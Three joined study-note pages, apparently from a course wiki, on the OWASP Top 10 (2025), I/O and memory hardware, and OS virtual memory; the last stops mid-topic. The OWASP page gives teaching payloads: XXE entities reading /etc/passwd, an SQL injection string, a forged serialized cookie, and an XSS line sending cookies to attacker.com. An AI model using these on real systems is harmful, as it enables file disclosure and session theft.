10	---
11	
12	# OWASP Top 10 (2025)
13	
14	The OWASP Top 10 is the definitive reference list of the most critical web application security risks, updated periodically based on real-world vulnerability data. The 2025 edition reflects a significant evolution from 2021, most notably elevating supply chain attacks and adding a new category for mishandled exceptional conditions.
15	
16	> Reference: https://owasp.org/www-project-top-ten/
17	
18	---
19	
20	## Notable Changes from 2021 → 2025
21	
22	| 2021 | 2025 | Change |
23	|------|------|--------|
24	| A06 Vulnerable & Outdated Components | A03 Software Supply Chain Failures | Elevated; scope broadened to entire supply chain |
25	| A07 Identification & Authentication Failures | A07 Authentication Failures | Name simplified |
26	| A09 Security Logging & Monitoring Failures | A09 Security Logging & Alerting Failures | "Alerting" added |
27	| A10 SSRF | A10 Mishandling of Exceptional Conditions | New category replaces SSRF |
28	
29	---
30	
31	## The Ten Categories
32	
33	---
34	
35	### A01:2025 — Broken Access Control
36	
37	Attackers modify parameters (URL, request body, cookies) to access unauthorised data or functionality.
38	
39	**Scenario 1 — Unverified parameter:**
40	```java
41	pstmt.setString(1, request.getParameter("acct"));
42	ResultSet results = pstmt.executeQuery();
43	// Attacker: http://example.com/app/accountInfo?acct=notmyacct
44	```
45	
46	**Scenario 2 — Force browsing:**
47	```
48	http://example.com/app/admin_getappInfo  ← accessible without admin role?
49	```
50	
51	**Case Study — Instagram:**
52	- Attacker requested a 6-digit password reset code, then brute-forced all possible codes via POST requests.
53	- Rate-limiting was applied **per IP**, not per account — rotating IPs bypassed it entirely.
54	
55	**Mitigations:** Server-side access control; deny by default; rate-limit per account (not IP); never expose admin functions in client-accessible paths.
56	
57	---
58	
59	### A02:2025 — Security Misconfiguration
60	
61	Default or missing configuration exposes the system to attack.
62	
63	**Scenarios:**
64	1. Sample applications with default credentials left on production servers.
65	2. Directory listing enabled → attacker downloads and decompiles compiled Java classes.
66	3. Detailed stack traces returned to users → reveals vulnerable component versions.
67	4. Cloud storage buckets left with default open sharing permissions.
68	
69	**XML External Entities (XXE):**
70	```xml
71	<!-- Read /etc/passwd -->
72	<?xml version="1.0" encoding="ISO-8859-1"?>
73	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
74	<foo>&xxe;</foo>
75	
76	<!-- SSRF: probe internal network -->
77	<!ENTITY xxe SYSTEM "https://192.168.1.1/private">
78	
79	<!-- DoS: read from infinite source -->
80	<!ENTITY xxe SYSTEM "file:///dev/random">
81	```
82	
83	**Mitigations:** Disable unnecessary features; harden all environments; suppress verbose error messages; restrict XML parser capabilities; enforce least-privilege cloud permissions.
84	
85	---
86	
87	### A03:2025 — Software Supply Chain Failures
88	
89	*Ranked #1 in community survey (50% of respondents).* Evolved from "Using Components with Known Vulnerabilities" (2013) to cover the entire supply chain.
90	
91	**Scenarios:**
92	1. A trusted vendor is compromised; malware is distributed via a legitimate software update.
93	2. A vendor behaves maliciously only under specific conditions.
94	3. Third-party components run with the same privileges as the application itself.
95	
96	**Real-world examples:**
97	
98	| Incident | Year | Impact |
99	|----------|------|--------|
100	| SolarWinds | 2019 | ~18,000 organisations compromised via a malicious build update |
101	| Bybit | 2025 | $1.5 billion stolen via supply chain attack in wallet software |
102	| Log4Shell (CVE-2021-44228) | 2021 | Apache Log4j RCE zero-day; exploited for ransomware and cryptomining |
103	
104	**Mitigations:** Software Bill of Materials (SBOM); verify signatures on dependencies; pin dependency versions; scan CI/CD pipelines; monitor build environments.
105	
106	---
107	
108	### A04:2025 — Cryptographic Failures
109	
110	Sensitive data is inadequately protected in transit, at rest, or in processing.
111	
112	**Key questions to ask:**
113	- Is data transmitted in cleartext (HTTP, SMTP, FTP)?
114	- Are old or weak algorithms in use (MD5, SHA-1, DES)?
115	- Are default or weak cryptographic keys used without rotation?
116	- Is TLS enforcement (HSTS) missing?
117	- Is server certificate validation bypassed?
118	
119	**Scenarios:**
120	1. Database auto-encrypts credit card numbers but decrypts on retrieval — SQL injection reads them in cleartext.
121	2. Site doesn't enforce TLS → attacker performs a protocol downgrade attack, intercepts session cookie, hijacks session.
122	3. Password database uses unsalted or fast hashes → rainbow table or GPU cracking exposes all passwords.
123	
124	> Storing API keys in source code or plaintext passwords in Dockerfiles are immediate cryptographic failures.
125	
126	**Mitigations:** Enforce TLS everywhere; use strong, modern algorithms (AES-256, bcrypt/Argon2 for passwords); rotate keys; use salted hashes; apply HSTS.
127	
128	---
129	
130	### A05:2025 — Injection (including XSS)
131	
132	Untrusted data is sent to an interpreter (SQL, HTML, OS, LDAP) without sanitisation.
133	
134	**SQL Injection:**
135	```java
136	// Vulnerable
137	String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
138	
139	// Attack: ?id=' or '1'='1
140	// Fix: use PreparedStatement with parameterised queries
141	```
142	
143	**Cross-Site Scripting (XSS) — Three Forms:**
144	
145	| Form | Description |
146	|------|-------------|
147	| **Reflected** | Unvalidated user input immediately echoed back in the HTML response |
148	| **Stored** | Unsanitised input persisted and later served to other users |
149	| **DOM** | JavaScript dynamically writes attacker-controlled data into the DOM |
150	
151	**Stored XSS example:**
152	```java
153	// Vulnerable
154	page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
155	
156	// Attack payload:
157	// '><script>document.location='http://attacker.com/steal?foo='+document.cookie</script>'
158	```
159	
160	**Mitigations:** Use parameterised queries / prepared statements; validate and sanitise all input; apply context-aware output encoding; use Content Security Policy (CSP).
161	
162	---
163	
164	### A06:2025 — Insecure Design
165	
166	Design-level flaws that no amount of secure implementation can fix. Requires threat modelling and "Secure by Design" principles.
167	
168	**Scenarios:**
169	1. Credential recovery via security questions — prohibited by NIST 800-63b (questions may be known by others).
170	2. Cinema chain allows group bookings with no rate limits → attacker books 600 seats simultaneously across all cinemas, causing massive revenue loss.
171	
172	**Mitigations:** Threat model during design; use reference architectures and secure design patterns; apply the principle of least privilege at the design stage; review for misuse/abuse cases.
173	
174	---
175	
176	### A07:2025 — Authentication Failures
177	
178	Weaknesses in authentication allow attackers to assume other users' identities.
179	
180	**Scenarios:**
181	1. No protection against credential stuffing → attacker uses lists of breached passwords to validate accounts.
182	2. Password rotation and complexity policies cause predictable patterns and reuse — NIST 800-63 recommends *against* these; use MFA instead.
183	3. Session timeout not configured → user's session remains active on a shared computer hours after closing the browser tab.
184	
185	**Mitigations:** Implement MFA; check passwords against breached-password lists (NIST 800-63); set appropriate session timeouts; use secure, randomly generated session tokens; implement account lockout.
186	
187	---
188	
189	### A08:2025 — Software and Data Integrity Failures
190	
191	Insecure CI/CD pipelines, missing integrity checks, and insecure deserialisation. (New category since 2021.)
192	
193	**Scenarios:**
194	1. Home router firmware updated without signature verification → unsigned or malicious firmware accepted.
195	2. SolarWinds — update mechanism hijacked; 18,000+ organisations affected.
196	
197	**Insecure deserialisation example:**
198	```
199	// Original PHP serialized cookie (role = user)
200	a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b..."}
201	
202	// Attacker modifies role to "admin"
203	a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b..."}
204	```
205	
206	**Mitigations:** Verify digital signatures on updates and software packages; use integrity-check mechanisms (checksums, HMAC); never deserialise untrusted data; use allow-lists for deserialisation.
207	
208	---
209	
210	### A09:2025 — Security Logging & Alerting Failures
211	
212	Insufficient logging means attacks go undetected and unattributed.
213	
214	**Indicators of failure:**
215	- Logins, failed logins, and high-value transactions are not logged.
216	- Logs are only stored locally and can be tampered with.
217	- No alerting thresholds or escalation processes.
218	- Penetration testing scans do not trigger alerts.
219	
220	**Real-world cases:**
221	
222	| Case | Impact |
223	|------|--------|
224	| Children's health plan provider | Breach undetected for **7+ years** (since 2013) due to no logging |
225	| Major Indian airline | Breach involving 10+ years of passenger data discovered by a third party |
226	| European airline | 400,000+ payment records harvested; fined **£20 million** under GDPR |
227	
228	**Mitigations:** Log all authentication events, privilege changes, and high-value transactions; ship logs to a centralised, tamper-evident store; set up automated alerting on anomalous patterns; establish an incident response process.
229	
230	---
231	
232	### A10:2025 — Mishandling of Exceptional Conditions *(New)*
233	
234	Improper error handling, logical errors, and "failing open" rather than securely.
235	
236	**Related CWEs:**
237	
238	| CWE | Description |
239	|-----|-------------|
240	| CWE-209 | Error messages containing sensitive information |
241	| CWE-234 | Failure to handle missing parameters |
242	| CWE-274 | Improper handling of insufficient privileges |
243	| CWE-476 | NULL pointer dereference |
244	| CWE-636 | Not failing securely ("failing open") |
245	
246	**Scenarios:**
247	1. **Resource exhaustion:** Application catches file upload exceptions but does not release resources → all resources lock up (DoS).
248	2. **Sensitive data exposure:** Database error messages returned to the user → attacker uses details to craft better SQL injection attacks.
249	3. **Financial race condition:** Multi-step transaction (debit → credit → log) is not rolled back on failure → attacker exploits timing to drain accounts or duplicate payments.
250	
251	**Mitigations:** Always release resources in finally blocks; return generic error messages to users; log full detail internally; ensure transactional atomicity; apply rollback on partial failure.
252	
253	---
254	
255	## Common Vulnerability Categories (Broader)
256	
257	Beyond OWASP, software vulnerabilities are often classified as:
258	
259	1. **Access Control Vulnerabilities** — incorrect permission checks
260	2. **Data Storage Vulnerabilities** — insecure storage or indexing of sensitive data
261	3. **Buffer Overflow Vulnerabilities** — writing past allocated memory bounds
262	4. **Authentication, Authorisation, or Cryptographic Vulnerabilities** — weak credentials or algorithms
263	5. **Validation Vulnerabilities** — missing or insufficient input validation
264	
265	---
266	
267	## Code Review Heuristic
268	
269	A simple code review example illustrating multiple categories simultaneously:
270	
271	```c
272	int balance;  // Global — no access control
273	
274	void decrease(int amount) {
275	    if (balance >= amount)
276	        balance = balance - amount;  // Race condition (no lock)
277	    else
278	        printf("Insufficient funds\n");
279	}
280	
281	void increase(int amount) {
282	    balance = balance + amount;  // Integer overflow possible; no validation of negative input
283	}
284	```
285	
286	Issues: global state, no thread safety, integer overflow, no input validation.
287	
288	---
289	
290	## Related Concepts
291	
292	- [[secure-software-requirements]] — OWASP ASVS maps directly onto security requirements; CIA-AAA covers many OWASP risks
293	- [[vulnerability-tracking-frameworks]] — CVE/NVD track vulnerabilities; MITRE ATT&CK maps techniques to OWASP categories
294	- [[docker-compose]] — misconfiguration (A02) often arises in container environments
295

1	---
2	type: concept
3	title: "I/O Interfacing and Memory Systems"
4	domain: computer-architecture
5	source: [[sources/ICT1011-computer-organisation-architecture]]
6	complexity: high
7	updated: 2026-05-13
8	tags: [concept, computer-architecture, io, serial-communication, memory, sram, dram, paging, msp430]
9	---
10	
11	# I/O Interfacing and Memory Systems
12	
13	Covers I/O interfacing techniques (serial/parallel, polled/interrupt, Bluetooth), secondary memory (HDD, RAID), primary memory (bus, SRAM, DRAM, ROM/Flash), and memory management (swapping, partitioning, paging).
14	
15	---
16	
17	## 1. I/O Interfacing Concepts
18	
19	### 1.1 Parallel vs Serial
20	
21	| | Parallel | Serial |
22	|--|---------|--------|
23	| Data path | Multiple bits simultaneously | One bit at a time |
24	| Speed | Fast | Slower per bit, but simpler wiring |
25	| Wiring | Many wires (one per bit) | One or two wires |
26	| Typical use | Internal buses, printer port (legacy) | UART, USB, SPI, I²C, Bluetooth |
27	
28	### 1.2 Duplex Modes
29	
30	| Mode | Description |
31	|------|-------------|
32	| **Simplex** | One direction only (transmit or receive) |
33	| **Half-duplex** | Both directions, but not simultaneously (one at a time) |
34	| **Full-duplex** | Both directions simultaneously (two independent channels) |
35	
36	### 1.3 Asynchronous Serial Communication Format
37	
38	Asynchronous serial does not use a shared clock. Timing is recovered from the data stream using a known **baud rate**.
39	
40	```
41	Idle    Start    D0  D1  D2  D3  D4  D5  D6  D7   Parity  Stop
42	─────── ──┐      ┌───┐   ┌───┐            ┌───┐           ┌────
43	MARK(1) │ │      │ 0 │   │ 1 │            │ 1 │   [P]     │  1
44	        │ └──────┘   └───┘   └───...───────┘   └───────────┘
45	        SPACE(0) LSB first
46	```
47	
48	| Field | Value |
49	|-------|-------|
50	| Start bit | Logic 0 (Space) — signals start of frame |
51	| Data bits | 7 or 8 bits, LSB transmitted first |
52	| Parity bit | Optional — Odd, Even, or None |
53	| Stop bit(s) | Logic 1 (Mark) — 1 or 2 bits |
54	
55	**Baud rate** = bits per second (including framing bits). `1/T` where T is bit period.
56	
57	> Data rate (payload bps) < baud rate because start/stop bits are overhead.
58	
59	**RS-232**: standard for DTE (Data Terminal Equipment, e.g., PC) ↔ DCE (Data Circuit-terminating Equipment, e.g., modem) serial communication. Voltage levels: Mark = −3 to −15 V; Space = +3 to +15 V (inverted logic compared to TTL).
60	
61	---
62	
63	## 2. Memory-Mapped I/O vs Isolated I/O
64	
65	| | Memory-Mapped I/O | Isolated I/O |
66	|--|------------------|-------------|
67	| Address space | Peripherals share the same address space as memory | Peripherals have a separate I/O address space |
68	| Instructions | Normal memory instructions (MOV) | Special IN/OUT instructions |
69	| Advantage | Orthogonal — any addressing mode works | Does not "consume" memory addresses |
70	| Used by | MSP430, ARM | Intel x86 (legacy) |
71	| MSP430 | 0x0000–0x09FF reserved for peripherals | — |
72	
73	---
74	
75	## 3. Polled I/O vs Interrupt-Driven I/O
76	
77	### 3.1 Polled (Busy-Wait) I/O
78	
79	The CPU continuously checks a status flag in a loop until the device is ready.
80	
81	```asm
82	poll_loop:
83	    BIT  #READY_FLAG, P1IN    ; test device ready bit
84	    JZ   poll_loop             ; not ready — loop
85	    MOV  P1IN, R4              ; ready — read data
86	```
87	
88	**Pros**: simple to implement.  
89	**Cons**: CPU is fully occupied during the wait; cannot do other work.
90	
91	### 3.2 Interrupt-Driven I/O
92	
93	The device raises an **Interrupt Request (IRQ)** when ready. The CPU:
94	1. Completes the current instruction
95	2. Pushes PC and SR onto the stack
96	3. Jumps to the **Interrupt Service Routine (ISR)** address in the interrupt vector table
97	4. Executes the ISR
98	5. Executes `RETI` — pops SR and PC, resuming the interrupted programme
99	
100	**Pros**: CPU is free to run other code between I/O events; efficient for slow or sporadic devices.  
101	**Cons**: More complex (ISR must be written; shared state must be protected).
102	
103	---
104	
105	## 4. Bluetooth
106	
107	| Parameter | Value |
108	|-----------|-------|
109	| Frequency band | 2402–2480 MHz (2.4 GHz ISM band) |
110	| Channels | 79 channels × 1 MHz spacing |
111	| Hopping | FHSS (Frequency-Hopping Spread Spectrum), 1600 hops/second |
112	| Access method | TDD-TDMA (Time Division Duplex) |
113	| Piconet | 1 master + up to 7 active slave devices |
114	| Scatternet | Multiple overlapping piconets sharing the band |
115	| BLE | Bluetooth Low Energy — reduced power, shorter bursts, optimised for IoT sensors |
116	
117	FHSS hops rapidly between channels, making Bluetooth resistant to narrowband interference and reducing the probability of colliding with other 2.4 GHz devices (Wi-Fi, microwave ovens).
118	
119	---
120	
121	## 5. Secondary Memory — Hard Disk Drive (HDD)
122	
123	### 5.1 Physical Structure
124	
125	| Component | Description |
126	|-----------|-------------|
127	| **Platter** | Rotating magnetic disk; both surfaces used |
128	| **Track** | Concentric ring on a platter surface |
129	| **Cylinder** | Set of all tracks at the same radius across all platters |
130	| **Sector** | Smallest addressable unit on a track (typically 512 B or 4 KB) |
131	| **Read/Write head** | One per platter surface; floats nanometres above the surface |
132	
133	### 5.2 Access Time Formula
134	
135	```
136	Total access time = Ts + Tr + Tt
137	
138	Ts  = seek time (head moves to correct track)
139	Tr  = rotational delay (average = 0.5 / RPS)
140	Tt  = transfer time = N / (RPS × DT × DS)
141	     where N  = number of bits to transfer
142	           RPS = rotations per second
143	           DT  = tracks per disk surface (used for density)
144	           DS  = sectors per track
145	```
146	
147	### 5.3 RAID
148	
149	| Level | Technique | Benefit | Drawback |
150	|-------|-----------|---------|---------|
151	| **RAID 0** | Striping — data split across N drives | Performance (parallel reads/writes) | No redundancy; any single drive failure = total loss |
152	| **RAID 1** | Mirroring — identical copy on each drive | Fault tolerance (survives one drive failure) | 50% storage efficiency |
153	| **RAID 10** | Stripe of mirrors (RAID 1 + RAID 0) | Performance + fault tolerance | Requires ≥ 4 drives; 50% efficiency |
154	
155	---
156	
157	## 6. Primary Memory — Bus Interconnect
158	
159	Three buses connect the CPU to memory and peripherals:
160	
161	| Bus | Width | Carries |
162	|-----|-------|---------|
163	| **Data bus** | Width = bits per transfer (e.g., 16-bit for MSP430) | Data values |
164	| **Address bus** | Width = log₂(max addressable memory) | Memory addresses |
165	| **Control bus** | Varies | Read/Write signal, interrupt request, clock, reset, bus grant |
166	
167	### 6.1 Synchronous Bus Transfers
168	
169	All transfers clocked by a shared bus clock. Simpler to implement and test. All devices must operate at the same clock rate — inflexible for mixing slow and fast devices.
170	
171	**Synchronous Read:**
172	1. CPU places address on address bus
173	2. CPU asserts Read on control bus
174	3. After fixed clock cycles (access time), memory places data on data bus
175	4. CPU latches data; releases address/control buses
176	
177	**Synchronous Write:**
178	1. CPU places address on address bus
179	2. CPU places data on data bus
180	3. CPU asserts Write on control bus
181	4. Memory latches data after fixed clock period
182	
183	### 6.2 Asynchronous Bus Transfers
184	
185	Uses a **handshake** protocol (ReadReq / DataReady / Ack). No shared clock required — flexible for devices operating at different speeds. Each device signals when it is ready; the bus waits.
186	
187	**Trade-off**: synchronous is simpler; asynchronous is flexible but more complex and can be slowed by a slow device holding the bus.
188	
189	### 6.3 Memory Performance
190	
191	| Metric | Definition |
192	|--------|-----------|
193	| **Access time (latency)** | Time from address placed on bus until data is available |
194	| **Memory cycle time** | Access time + any additional time before the next access can begin |
195	| **Transfer rate** | 1 / memory cycle time for RAM; TN = TA + (N/R) for sequential devices |
196	
197	---
198	
199	## 7. Primary Memory — Technologies
200	
201	### 7.1 RAM Overview
202	
203	Random Access Memory: both reads and writes, any address, in any order. **Volatile** — data lost on power-off.
204	
205	| | SRAM | DRAM |
206	|--|------|------|
207	| Cell structure | Cross-connected inverters (latch) + 2 transistors | 1 transistor + 1 capacitor |
208	| Stability | Holds data without refresh | Must be refreshed periodically (charge leaks) |
209	| Speed | Fast (few ns) | Slower |
210	| Density | Lower (more transistors per bit) | Higher (smaller cell) |
211	| Cost | Higher | Lower |
212	| Typical use | Cache (L1/L2/L3) | Main memory |
213	
214	**SRAM operation**: Word Line selects a row; Bit Lines carry the value. The latch holds the state as long as power is supplied.
215	
216	**DRAM operation**: 
217	- **Write**: drive bit line; row access (Word Line) charges/discharges capacitor
218	- **Read**: Word Line activated; sense amplifiers on bit lines detect charge level. Reading also refreshes the row.
219	- **Refresh**: must periodically activate each row to restore charge before it decays below threshold.
220	
221	### 7.2 ROM and Flash
222	
223	**ROM** (Read-Only Memory): contents written at manufacture. Single transistor per cell; write-once.
224	
225	| Type | Write mechanism | Erase mechanism |
226	|------|----------------|----------------|
227	| **ROM** | At manufacture (mask-programmed) | Cannot be erased |
228	| **PROM** | One-time — burn fuses with high current pulse | Cannot be erased |
229	| **EPROM** | Inject charge to turn on floating-gate transistor | UV light (erases entire chip) |
230	| **EEPROM** | Electrical charge injection (individual bytes) | Electrical (individual bytes) |
231	| **Flash** | Electrical (like EEPROM) | Electrical, but in **blocks** (not individual bytes) |
232	
233	Flash key properties:
234	- Higher density and lower cost than EEPROM
235	- Write requires read-erase-write of the entire block
236	- Widely used in SSDs, USB drives, mobile phones, digital cameras
237	- MSP430 stores programme code in Flash (non-volatile, survives power-off)
238	
239	---
240	
241	## 8. Memory Management
242	
243	Memory management is the operating system's responsibility. Its goal is to support **multi-programming** — running multiple processes efficiently while keeping them isolated.
244	
245	### 8.1 Uni-Program vs Multi-Program
246	
247	| | Uni-program | Multi-program |
248	|--|------------|--------------|
249	| Concurrent processes | 1 | Many |
250	| CPU utilisation | Low (idle during I/O waits) | High (another process runs while one waits) |
251	| Memory | OS + one user programme | OS + multiple user programmes |
252	
253	### 8.2 Swapping
254	
255	When main memory is full, the OS moves a blocked process out to **secondary storage** (intermediate queue) and loads a ready process in. This is an I/O operation and has a cost.
256	
257	```
258	Long-term queue (disk) → [swap in] → Main memory → [swap out] → Intermediate queue (disk)
259	```
260	
261	### 8.3 Partitioning
262	
263	Dividing main memory into regions for each process.
264	
265	**Fixed Partitioning**:
266	- Memory divided into fixed-size regions at system start
267	- Process assigned to smallest region that fits (**best fit**)
268	- Problem: **internal fragmentation** — unused space inside a too-large partition
269	
270	**Dynamic Partitioning**:
271	- Each process gets exactly the memory it needs
272	- Problem: **external fragmentation** — over time, many small gaps (holes) appear between processes; individually too small to use
273	- Solutions:
274	  - **Coalescing**: merge adjacent free holes into one larger hole
275	  - **Compaction**: periodically move all processes to one end of memory, consolidating all free space into one block
276	
277	### 8.4 Paging
278	
279	Paging eliminates external fragmentation entirely by allowing non-contiguous allocation.
280	
281	| Term | Definition |
282	|------|-----------|
283	| **Page** | Fixed-size chunk of a process's logical (virtual) address space |
284	| **Frame / Page frame** | Fixed-size chunk of physical memory (same size as a page) |
285	| **Page table** | Per-process mapping: page number → frame number |
286	
287	**Key property**: a process's pages do not need to occupy contiguous frames. The OS maintains a **free frame list** and assigns any available frames.
288	
289	**Address translation**:
290	
291	```
292	Logical address:   [ page number (n−m bits) | page offset (m bits) ]
293	                              │
294	                    Index into page table
295	                              │
296	                         frame number
297	                              │
298	Physical address:  [ frame number | page offset (m bits) ]
299	```
300	
301	Example: 16-bit logical address, 10-bit page offset → 1024 bytes/page, 64 pages (6-bit page number).
302	
303	```
304	Logical: Page 1, Offset 30  →  Page table[1] = Frame 13  →  Physical: Frame 13, Offset 30
305	```
306	
307	**Benefits of paging**:
308	- No external fragmentation (any frame can hold any page)
309	- Processes can be larger than any single contiguous free block
310	- Enables virtual memory (pages can be swapped to disk on demand)
311	
312	**Relocation**: because a process may be loaded into different frames on each swap-in, programmes use **logical addresses**. The **Memory Management Unit (MMU)** translates logical → physical at runtime.
313	
314	---
315	
316	## Summary
317	
318	```
319	I/O Techniques
320	├── Parallel / Serial
321	├── Simplex / Half-duplex / Full-duplex
322	├── Async serial: start + data + parity + stop; baud rate
323	├── Memory-mapped vs isolated I/O
324	├── Polled (busy-wait) vs Interrupt-driven
325	└── Bluetooth: FHSS, piconet, BLE
326	
327	Secondary Memory
328	├── HDD: platters → tracks → cylinders → sectors
329	├── Access time: Ts + Tr + Tt
330	└── RAID: 0 (stripe), 1 (mirror), 10 (stripe+mirror)
331	
332	Primary Memory
333	├── Bus: data / address / control
334	├── Synchronous (clocked) vs Asynchronous (handshake)
335	├── SRAM: latch, fast → cache
336	├── DRAM: capacitor, refresh, high density → main memory
337	└── ROM/Flash: non-volatile; Flash in blocks
338	
339	Memory Management
340	├── Swapping: disk ↔ main memory
341	├── Fixed partition → internal fragmentation
342	├── Dynamic partition → external fragmentation → coalesce/compact
343	└── Paging: pages + frames + page table → no external fragmentation
344	```
345	
346	## See Also
347	
348	- [[concepts/computer-architecture-fundamentals|Computer Architecture Fundamentals]] — Von Neumann, MSP430, ISA
349	- [[concepts/assembly-programming-msp430|Assembly Programming (MSP430)]] — assembly, instructions, modular programming
350	- [[sources/ICT1011-computer-organisation-architecture|ICT1011 Source Page]]
351

1	---
2	type: concept
3	title: "Memory Management and Virtual Memory"
4	domain: operating-systems
5	source: [[sources/ICT1012-operating-systems]]
6	complexity: high
7	updated: 2026-05-13
8	tags: [concept, operating-systems, memory-management, paging, tlb, virtual-memory, demand-paging, page-replacement]
9	---
10	
11	# Memory Management and Virtual Memory
12	
13	Covers address binding, the MMU, paging, TLB, page table structures, virtual memory, demand paging, page replacement algorithms, thrashing, and the working-set model.
14	
15	---
16	
17	## 1. Background
18	
19	- CPU can access only **registers** and **main memory** directly
20	- A programme must be loaded into memory before execution
21	- **Cache** sits between CPU registers and main memory to bridge the speed gap
22	- Memory protection required: the OS prevents user programmes from accessing kernel memory or each other's memory
23	
24	### Base and Limit Registers
25	
26	Each process is given a pair of hardware registers:
27	- **Base register**: smallest physical address the process may access
28	- **Limit register**: size of the legal address range
29	
30	Every memory access is checked: `base ≤ address < base + limit`, otherwise trap to kernel.
31	
32	---
33	
34	## 2. Address Binding
35	
36	Addresses in a programme go through several transformations before execution:
37	
38	| Stage | Address form | When binding occurs |
39	|-------|-------------|-------------------|
40	| **Source code** | Symbolic (`count`, `loop`) | — |
41	| **Compile time** | Relocatable (14 bytes from module start) | Fixed → absolute if start address known at compile time |
42	| **Link/load time** | Absolute | If start address known only at load time |
43	| **Execution time** | Virtual (logical) | If process can be moved during execution |
44	
45	### Logical vs Physical Address
46	
47	- **Logical (virtual) address**: generated by the CPU
48	- **Physical address**: seen by the memory unit (actual DRAM location)
49	- Identical at compile/load time; differ at execution time
50	
51	---
52	
53	## 3. Memory Management Unit (MMU)
54	
55	Hardware device that translates **logical → physical** address at runtime.
56	
57	**Simple scheme (relocation register)**: physical = logical + relocation_register. The user programme only sees logical addresses.
58	
59	**Dynamic loading**: routines loaded only when called — unused code never loaded. Better space utilisation. No OS support required (implemented in programme).
60	
61	**Dynamic linking**: linking deferred to execution. A stub locates the library routine in memory (or loads it). Shared libraries can be patched without recompiling applications.
62	
63	---
64	
65	## 4. Contiguous Memory Allocation
66	
67	Memory divided into: OS region (low) + user processes region (high).
68	
69	**Variable partition**: each process gets exactly the memory it needs.
70	
71	**Placement policies**:
72	| Policy | Description |
73	|--------|-------------|
74	| **First-fit** | Allocate first hole ≥ request size; fast |
75	| **Best-fit** | Smallest hole ≥ request size; minimises leftover, but slow |
76	| **Worst-fit** | Largest hole; leaves biggest leftover; worst in practice |
77	
78	First-fit and best-fit outperform worst-fit.
79	
80	**50% rule**: first-fit analysis shows ~0.5N blocks wasted for N allocated.
81	
82	---
83	
84	## 5. Fragmentation
85	
86	| Type | Cause | Solution |
87	|------|-------|---------|
88	| **External** | Enough total free memory, but not contiguous | Compaction (shuffle processes) — only possible with execution-time binding |
89	| **Internal** | Allocated partition larger than requested | Smaller partition sizes |
90	
91	---
92	
93	## 6. Paging
94	
95	Paging **eliminates external fragmentation** by allowing non-contiguous allocation.
96	
97	| Term | Definition |
98	|------|-----------|
99	| **Frame** | Fixed-size chunk of physical memory (power of 2, typically 4 KB) |
100	| **Page** | Fixed-size chunk of process logical memory (same size as frame) |
101	| **Page table** | Per-process mapping: page number → frame number |
102	
103	A process of N pages needs N free frames (not necessarily contiguous).
104	
105	### Address Translation
106	
107	```
108	Logical address = [ page number (p) | page offset (d) ]
109	                         ↓ index into page table
110	                    frame number (f)
111	                         ↓
112	Physical address = [ frame number (f) | page offset (d) ]
113	```
114	
115	For logical address space 2^m and page size 2^n: p uses (m−n) bits, d uses n bits.
116	
117	**Paging still has internal fragmentation** — the last page of a process is typically partially used. Average waste: ½ page per process.
118	
119	### Page Table Implementation
120	
121	| Method | Speed | Cost | Notes |
122	|--------|-------|------|-------|
123	| Hardware registers | Very fast | Expensive; only for small tables | Context switch overhead |
124	| Main memory (PTBR) | Slower | Cheap | Every access requires 2 memory reads (table + data) |
125	| **TLB** | Fast | Moderate | Caches recent page→frame translations |
126	
127	**PTBR** = Page Table Base Register; **PTLR** = Page Table Length Register.
128	
129	### TLB — Translation Look-aside Buffer
130	
131	A small, fast associative hardware cache of (page number → frame number) entries.
132	
133	```
134	CPU generates logical address
135	         ↓
136	   TLB lookup (parallel search)
137	   ↙             ↘
138	TLB hit           TLB miss
139	  ↓                  ↓
140	frame found      look up page table in memory
141	  ↓                  ↓
142	                 add entry to TLB
143	         ↓
144	form physical address and access memory
145	```
146	
147	**Effective Access Time (EAT)**:
148	```
149	EAT = hit_ratio × memory_access + (1 − hit_ratio) × 2 × memory_access
150	
151	Example (99% hit ratio, 10 ns access):
152	EAT = 0.99 × 10 + 0.01 × 20 = 10.1 ns  (only 1% slowdown)
153	```
154	
155	TLBs store **ASIDs** (Address Space IDs) to allow multiple processes' entries to coexist without flushing on every context switch.
156	
157	### Memory Protection via Page Table
158	
159	- **Valid–invalid bit**: marks whether a page is in the process's legal address space
160	- **Protection bits**: read-only, read-write, execute permissions per page
161	
162	### Shared Pages
163	
164	Read-only code (e.g., standard library, compiler) can be shared: multiple processes map to the same physical frames. Each process keeps private data pages.
165	
166	---
167	
168	## 7. Page Table Structures
169	
170	A 32-bit address space with 4 KB pages → 1 million page table entries → 4 MB of page table per process. Solutions:
171	
172	### Hierarchical Paging (Two-Level)
173	
174	Page the page table itself. A 32-bit logical address: 10-bit outer page, 10-bit inner page, 12-bit offset.
175	
176	```
177	logical address: [ p1 (10) | p2 (10) | d (12) ]
178	    p1 → outer page table → inner page table
179	    p2 → inner page table → frame number
180	    frame + d → physical address
181	```
182	
183	64-bit spaces require 3+ levels.
184	
185	### Hashed Page Tables
186	
187	Virtual page number is hashed. Each bucket is a linked list of (VPN, frame, next) entries — handles collisions. Used for >32-bit address spaces.
188	
189	**Clustered page tables**: each entry covers 16+ pages — useful for sparse address spaces.
190	
191	### Inverted Page Table
192	
193	**One global table** for the entire system, indexed by physical frame number. Each entry: (VPN, process ID). 
194	- Advantage: small, fixed size
195	- Disadvantage: slow search (must scan by VPN); usually combined with hash
196	
197	---
198	
199	## 8. Swapping
200	
201	A process can be temporarily **swapped out** to a backing store (disk) and later swapped back in.
202	
203	- Increases degree of multiprogramming
204	- Main cost is **transfer time** (proportional to amount of memory swapped)
205	- Modern OS uses swapping with paging: swap individual pages, not whole processes
206	
207	---
208	
209	## 9. Virtual Memory
210	
211	Virtual memory separates **user logical memory** from **physical memory**. Only the part of a programme actually needed need be in memory at any time.
212	
213	Benefits:
214	- Logical address space can be **much larger** than physical memory
215	- Multiple processes share physical memory more efficiently
216	- Processes start faster (less initial loading)
217	
218	### Virtual Address Space
219	
220	```
221	High address (max logical)
222	  Stack ↓   (grows down)
223	  [hole]    (no physical memory allocated unless needed)
224	  Heap  ↑   (grows up)
225	  Data / BSS
226	  Text
227	Low address (0)
228	```
229	
230	---
231	
232	## 10. Demand Paging
233	
234	Pages are loaded into memory **only when accessed** (lazy loading). A **pager** (not a swapper) manages individual pages.
235	
